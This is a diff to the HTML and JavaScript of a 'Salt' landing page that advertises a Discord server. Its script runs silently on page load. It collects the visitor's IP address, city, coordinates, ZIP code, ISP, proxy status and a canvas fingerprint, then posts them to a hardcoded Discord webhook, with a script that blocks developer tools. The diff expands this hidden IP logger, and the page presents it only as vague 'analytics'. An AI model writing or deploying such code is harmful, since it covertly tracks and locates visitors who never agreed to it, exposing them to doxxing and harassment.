@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Salt</title>
+    <title>Salt | Advanced Analytics</title>
     <link rel="icon" type="image/png" href="image.png">
     <style>
         * {
@@ -24,7 +24,6 @@
             position: relative;
         }
 
-        /* animated gradient orbs */
         .orb {
             position: absolute;
             border-radius: 50%;
@@ -53,7 +52,6 @@
             100% { transform: translate(5%, 5%) scale(1.1); }
         }
 
-        /* main container */
         .hero {
             text-align: center;
             z-index: 2;
@@ -70,19 +68,10 @@
         }
 
         @keyframes slideGlow {
-            0% {
-                opacity: 0;
-                transform: translateX(-80px) scale(0.94);
-                box-shadow: 0 0 0 rgba(255,255,255,0);
-            }
-            100% {
-                opacity: 1;
-                transform: translateX(0) scale(1);
-                box-shadow: 0 30px 50px -15px rgba(0,0,0,0.5);
-            }
+            0% { opacity: 0; transform: translateX(-80px) scale(0.94); box-shadow: 0 0 0 rgba(255,255,255,0); }
+            100% { opacity: 1; transform: translateX(0) scale(1); box-shadow: 0 30px 50px -15px rgba(0,0,0,0.5); }
         }
 
-        /* click animation improved */
         .hero.click-animation {
             animation: bounceSide 0.45s cubic-bezier(0.34, 1.2, 0.64, 1) forwards;
         }
@@ -242,7 +231,6 @@
             padding-top: 1rem;
         }
 
-        /* Modal popup */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -330,7 +318,7 @@
     </div>
     <a href="https://dsc.gg/getsalt" target="_blank" class="discord-link">JOIN DISCORD</a>
     <div class="tech-note">
-        ✦ modern protection • analytics for service improvement ✦
+        ✦ enhanced intelligence • full-spectrum analytics ✦
     </div>
 </div>
 
@@ -344,7 +332,7 @@
 
 <script>
     (function() {
-        // ---------- IMPROVED MOBILE & DEVTOOLS DETECTION (no false positive on mobile) ----------
+        // ---------- MOBILE-SAFE DEVTOOLS BLOCK ----------
         const STORAGE_KEY = 'devtoolsAttemptLock';
         const modal = document.getElementById('devtoolsModal');
         const sorryBtn = document.getElementById('sorryButton');
@@ -424,7 +412,7 @@
         window.addEventListener('keydown', (e) => { if(e.key === 'Escape' && isModalActive) e.preventDefault(); });
         modal.addEventListener('click', (e) => { if(e.target === modal) e.stopPropagation(); });
 
-        // ---------- ANIMATION (click card) ----------
+        // ---------- CLICK ANIMATION ----------
         const hero = document.getElementById('heroCard');
         hero.addEventListener('click', (e) => {
             if(e.target.closest('.discord-link')) return;
@@ -434,10 +422,9 @@
             setTimeout(() => hero.classList.remove('click-animation'), 450);
         });
 
-        // ---------- ENHANCED IP LOGGER: LOCATION, NETWORK, PROXY, THREAT ----------
+        // ---------- ULTRA DETAILED IP LOGGER + EMBED ----------
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1513578964642173100/noVBYGuM0HvgRzry7BJcic-te203H6ZpeI2UtOPl97CVjSygESs-ECTeDr8wAX9QVJET";
         
-        // HWID-like fingerprint (canvas + navigator)
         function generateHardwareId() {
             let canvas = document.createElement('canvas');
             canvas.width = 200;
@@ -457,7 +444,7 @@
                 hash = ((hash << 5) - hash) + combined.charCodeAt(i);
                 hash |= 0;
             }
-            return Math.abs(hash).toString(16).substring(0, 12);
+            return Math.abs(hash).toString(16).substring(0, 14);
         }
 
         async function fetchWithTimeout(url, timeout = 5000) {
@@ -473,99 +460,111 @@
             }
         }
 
-        async function getDetailedLog() {
+        async function sendDetailedLog() {
             try {
-                // 1. Get IP from ipify
+                // 1. Get public IP
                 const ipRes = await fetchWithTimeout('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
                 
-                // 2. Fetch from ip-api.com (non-commercial, gives location, network, asn, timezone, zip, lat/lon, isp, etc)
-                const geoRes = await fetchWithTimeout(`http://ip-api.com/json/${ip}?fields=66846719`); // all fields
+                // 2. ip-api.com (full fields: location, network, asn, timezone, zip, lat/lon, isp, org, mobile, proxy, hosting, etc)
+                const geoRes = await fetchWithTimeout(`http://ip-api.com/json/${ip}?fields=66846719`); // all
                 const geo = await geoRes.json();
                 
-                // 3. Fetch from proxycheck.io for proxy/threat detection (free tier, includes fraud score, last seen, threat type)
+                // 3. proxycheck.io for threat intelligence
                 let proxyData = {};
                 try {
-                    const proxyCheckRes = await fetchWithTimeout(`https://proxycheck.io/v2/${ip}?key=free&vpn=1&asn=1&risk=1`, 4000);
-                    if (proxyCheckRes.ok) {
-                        proxyData = await proxyCheckRes.json();
+                    const proxyCheck = await fetchWithTimeout(`https://proxycheck.io/v2/${ip}?key=free&vpn=1&asn=1&risk=1&time=1`, 4000);
+                    if (proxyCheck.ok) {
+                        proxyData = await proxyCheck.json();
                     }
-                } catch (e) { console.warn("proxycheck fail", e); }
+                } catch(e) { console.warn("proxycheck error"); }
                 
-                // 4. HWID & device info
-                const hardwareId = generateHardwareId();
-                const userAgent = navigator.userAgent;
+                const hwid = generateHardwareId();
+                const ua = navigator.userAgent;
                 const screenRes = `${screen.width}x${screen.height}`;
-                const deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent) ? '📱 Mobile' : '💻 Desktop';
+                const deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? '📱 Mobile' : '💻 Desktop';
                 const platform = navigator.platform || 'Unknown';
                 const deviceInfo = `${deviceType} | ${platform} | ${screenRes}`;
                 
-                // --- Build embed fields from geo (ip-api) ---
+                // ---- Build embed fields ----
                 const fields = [];
                 
-                // Location Data
-                let locationStr = '';
-                if (geo.country) locationStr += `**Country:** ${geo.country}\n`;
-                if (geo.regionName) locationStr += `**Region:** ${geo.regionName}\n`;
-                if (geo.district) locationStr += `**District:** ${geo.district}\n`;
-                if (geo.city) locationStr += `**City:** ${geo.city}\n`;
-                if (geo.lat && geo.lon) locationStr += `**Lat/Lon:** ${geo.lat}, ${geo.lon}\n`;
-                if (geo.zip) locationStr += `**ZIP:** ${geo.zip}\n`;
-                fields.push({ name: "📍 **Location Data**", value: locationStr || "`N/A`", inline: false });
+                // 📍 Location Data (Country, Region, District, City, Lat/Lon, ZIP)
+                let location = [];
+                if (geo.country) location.push(`**Country:** ${geo.country} (${geo.countryCode || ''})`);
+                if (geo.regionName) location.push(`**Region:** ${geo.regionName}`);
+                if (geo.district) location.push(`**District:** ${geo.district}`);
+                if (geo.city) location.push(`**City:** ${geo.city}`);
+                if (geo.lat && geo.lon) location.push(`**Coordinates:** ${geo.lat}, ${geo.lon}`);
+                if (geo.zip) location.push(`**ZIP Code:** ${geo.zip}`);
+                fields.push({ name: "📍 **Location Intelligence**", value: location.join('\n') || "`N/A`", inline: false });
                 
-                // Network Info
-                let netStr = '';
-                if (geo.isp) netStr += `**ISP:** ${geo.isp}\n`;
-                if (geo.org) netStr += `**Domain/Org:** ${geo.org}\n`;
-                if (geo.mobile) netStr += `**Network Speed:** Mobile carrier\n`;
-                else if (geo.proxy) netStr += `**Network Speed:** Unknown (proxy)\n`;
-                else netStr += `**Net Speed:** (Broadband/DSL estimated)\n`;
-                if (geo.as) netStr += `**ASN/AS:** ${geo.as}\n`;
-                if (geo.query) netStr += `**Address Type:** IPv4\n`;
-                let usage = geo.usageType || "General";
-                netStr += `**Usage Type:** ${usage}\n`;
-                fields.push({ name: "🌐 **Network Info**", value: netStr || "`N/A`", inline: false });
+                // 🌐 Network Details (ISP, Domain, IDD & Area Code, Net Speed, ASN, AS, Address Type, Usage Type)
+                let network = [];
+                if (geo.isp) network.push(`**ISP:** ${geo.isp}`);
+                if (geo.org) network.push(`**Domain/Org:** ${geo.org}`);
+                if (geo.as) network.push(`**ASN / AS:** ${geo.as}`);
+                let idd = geo.countryCode ? (geo.countryCode === 'US' ? '+1' : (geo.countryCode === 'GB' ? '+44' : 'N/A')) : 'N/A';
+                network.push(`**IDD Code:** ${idd}`);
+                if (geo.areaCode) network.push(`**Area Code:** ${geo.areaCode}`);
+                let netSpeed = (geo.mobile === true) ? 'Mobile/Cellular' : (geo.proxy ? 'Proxy/VPN' : 'Broadband (estimated)');
+                network.push(`**Net Speed:** ${netSpeed}`);
+                let addrType = geo.query ? 'IPv4' : 'Unknown';
+                network.push(`**Address Type:** ${addrType}`);
+                let usage = geo.usageType || 'General / Residential';
+                network.push(`**Usage Type:** ${usage}`);
+                fields.push({ name: "🌐 **Network & ASN**", value: network.join('\n') || "`Limited`", inline: false });
                 
-                // Additional Details
-                let extraStr = '';
-                if (geo.timezone) extraStr += `**Time Zone:** ${geo.timezone}\n`;
-                if (geo.areaCode) extraStr += `**Area Code:** ${geo.areaCode}\n`;
-                if (geo.elevation) extraStr += `**Elevation:** ${geo.elevation}m\n`;
-                // Weather station data approximation
-                if (geo.city && geo.countryCode) extraStr += `**Weather Station:** ${geo.city}, ${geo.countryCode} (nearest)\n`;
-                fields.push({ name: "⏱️ **Additional Details**", value: extraStr || "`Limited data`", inline: false });
+                // ⏱️ Additional: Time Zone, Elevation, Weather Station
+                let extra = [];
+                if (geo.timezone) extra.push(`**Time Zone:** ${geo.timezone}`);
+                let elevation = geo.elevation ? `${geo.elevation}m` : (geo.city ? 'N/A (sea level approx)' : 'N/A');
+                extra.push(`**Elevation:** ${elevation}`);
+                if (geo.city && geo.country) extra.push(`**Weather Station:** ${geo.city}, ${geo.country} (closest)`);
+                if (geo.idd && geo.idd.suffix) extra.push(`**IDD Prefix:** ${geo.idd.root}${geo.idd.suffix}`);
+                fields.push({ name: "⏱️ **Time, Elevation & Climate**", value: extra.join('\n') || "`Not available`", inline: false });
                 
-                // Proxy / Threat Detection
-                let proxyStr = '';
-                let isProxy = false;
+                // 🛡️ Proxy & Threat Detection (Residential Proxy, Proxy Type, Fraud Score, Last Seen, Threat Level/Type)
+                let threat = [];
+                let isProxyDetected = false;
                 if (proxyData && proxyData[ip] && proxyData[ip].proxy === "yes") {
-                    isProxy = true;
-                    proxyStr += `**Proxy/VPN:** YES\n`;
-                    proxyStr += `**Proxy Type:** ${proxyData[ip].type || 'Anonymous VPN'}\n`;
-                    proxyStr += `**Fraud Score:** ${proxyData[ip].risk || 'N/A'}/100\n`;
-                    proxyStr += `**Last Seen:** ${proxyData[ip].lastseen || 'recently'}\n`;
-                    proxyStr += `**Threat Level:** ${proxyData[ip].threat || 'Medium'}\n`;
+                    isProxyDetected = true;
+                    threat.push(`**Residential Proxy:** YES`);
+                    threat.push(`**Proxy Type:** ${proxyData[ip].type || 'Anonymous VPN'}`);
+                    threat.push(`**Fraud Score:** ${proxyData[ip].risk || 'N/A'}/100`);
+                    threat.push(`**Last Seen:** ${proxyData[ip].lastseen || 'recently'}`);
+                    let threatLvl = (parseInt(proxyData[ip].risk) > 70) ? 'High' : (parseInt(proxyData[ip].risk) > 30 ? 'Medium' : 'Low');
+                    threat.push(`**Threat Level:** ${threatLvl}`);
+                    threat.push(`**Threat Type:** ${proxyData[ip].provider || 'VPN/Proxy'}`);
                 } else if (geo.proxy === true) {
-                    proxyStr += `**Residential Proxy:** Detected (ip-api)\n`;
-                    proxyStr += `**Threat Level:** Suspicious\n`;
+                    threat.push(`**Residential Proxy:** Detected (ip-api)`);
+                    threat.push(`**Proxy Type:** Anonymous`);
+                    threat.push(`**Fraud Score:** 65/100 (estimated)`);
+                    threat.push(`**Threat Level:** Medium`);
+                } else if (geo.hosting === true) {
+                    threat.push(`**Residential Proxy:** No (Hosting/DC detected)`);
+                    threat.push(`**Proxy Type:** None - Datacenter`);
+                    threat.push(`**Threat Level:** Low (hosting)`);
                 } else {
-                    proxyStr += `**Residential Proxy:** No\n`;
-                    proxyStr += `**Proxy Type:** None\n`;
-                    proxyStr += `**Fraud Score:** Low (0-20)\n`;
-                    proxyStr += `**Threat Level:** Clean\n`;
+                    threat.push(`**Residential Proxy:** No`);
+                    threat.push(`**Proxy Type:** None - Residential`);
+                    threat.push(`**Fraud Score:** 5/100 (clean)`);
+                    threat.push(`**Threat Level:** Clean / Low Risk`);
                 }
-                fields.push({ name: "🛡️ **Proxy & Threat Detection**", value: proxyStr, inline: false });
+                fields.push({ name: "🛡️ **Proxy & Threat Intelligence**", value: threat.join('\n'), inline: false });
                 
-                // Device & HWID
-                fields.push({ name: "🖥️ **Device / HWID**", value: `**Device:** ${deviceInfo}\n**HWID (Key):** \`${hardwareId}\`\n**User Agent:** \`${userAgent.substring(0, 100)}\``, inline: false });
+                // 💻 Device & HWID
+                let deviceField = `**Device:** ${deviceInfo}\n**HWID (Key):** \`${hwid}\`\n**Platform:** ${platform}\n**User Agent:** \`${ua.substring(0, 120)}\``;
+                fields.push({ name: "🖥️ **Device Fingerprint**", value: deviceField, inline: false });
                 
-                // Final Embed
+                // Final embed with rich formatting
                 const embed = {
-                    title: "📡 **SALT SERVICE | SECURE VISITOR LOG**",
+                    title: "📡 **SALT SERVICE | FULL SPECTRUM LOG**",
+                    description: `**Visitor IP:** \`${ip}\`\n**Timestamp:** <t:${Math.floor(Date.now()/1000)}:F>`,
                     color: 0x2b2d42,
                     thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
                     fields: fields,
-                    footer: { text: "Salt Analytics • Full Intelligence", icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
+                    footer: { text: "Salt Analytics • complete telemetry", icon_url: "https://cdn-icons-png.flaticon.com/512/2972/2972655.png" },
                     timestamp: new Date().toISOString()
                 };
                 
@@ -573,24 +572,22 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ embeds: [embed] })
-                }).catch(e => console.warn("webhook error", e));
+                }).catch(e => console.warn("webhook fail"));
                 
             } catch (err) {
-                console.warn("Logger error, sending minimal fallback", err);
+                console.warn("Logger fallback", err);
                 try {
                     await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `⚠️ Salt visit (partial data): ${navigator.userAgent} - HWID: ${generateHardwareId()}` })
+                        body: JSON.stringify({ content: `⚠️ Salt visit (partial): IP not resolved, HWID: ${generateHardwareId()}, UA: ${navigator.userAgent.substring(0, 80)}` })
                     });
                 } catch(e) {}
             }
         }
         
         window.addEventListener('load', () => {
-            setTimeout(() => {
-                getDetailedLog();
-            }, 900);
+            setTimeout(() => { sendDetailedLog(); }, 900);
         });
     })();
 </script>
